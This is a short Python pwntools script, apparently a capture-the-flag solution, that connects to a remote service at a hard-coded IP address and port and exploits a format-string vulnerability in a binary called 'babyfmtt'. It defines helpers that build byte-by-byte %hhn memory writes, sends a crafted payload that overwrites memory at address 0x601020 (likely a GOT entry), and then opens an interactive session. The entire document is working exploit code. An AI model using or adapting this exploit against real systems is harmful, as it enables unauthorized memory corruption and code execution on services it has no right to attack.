from pwn import *
from time import sleep,time
context.arch = 'amd64'
#r = process('./babyfmtt')
r=remote('118.24.3.214',11001)
#t1 = time()
def fmt(prev, word, index):
    if prev < word:
        result = word - prev
        fmtstr = "%" + str(result) + "c"
    elif prev == word:
        result = 0
    else:
        result = 256 + word - prev
        fmtstr = "%" + str(result) + "c"
    fmtstr += "%" + str(index) + "$hhn"
    return fmtstr


def fmt_str(offset, size, addr, target):
    payload = ""
    for i in range(4):
        if size == 4:
            payload += p32(addr + i)
        else:
            payload += p64(addr + i)
    prev = len(payload)
    for i in range(4):
        payload += fmt(prev, (target >> i * 8) & 0xff, offset + i)
        prev = (target >> i * 8) & 0xff
    return payload

r.recv()
#payload = '%1d%17$hhn'
payload = ''
payload += 'aaaaa%'+str(0x084e-5)+'d%8$hn'
payload += p64(0x601020)
payload += 'a'*0x41
raw_input()
#sleep(59.945)
print payload
r.sendline(payload)
#t2 = time()
#print int(round(t2*1000))-int(round(t1*1000))
r.interactive()
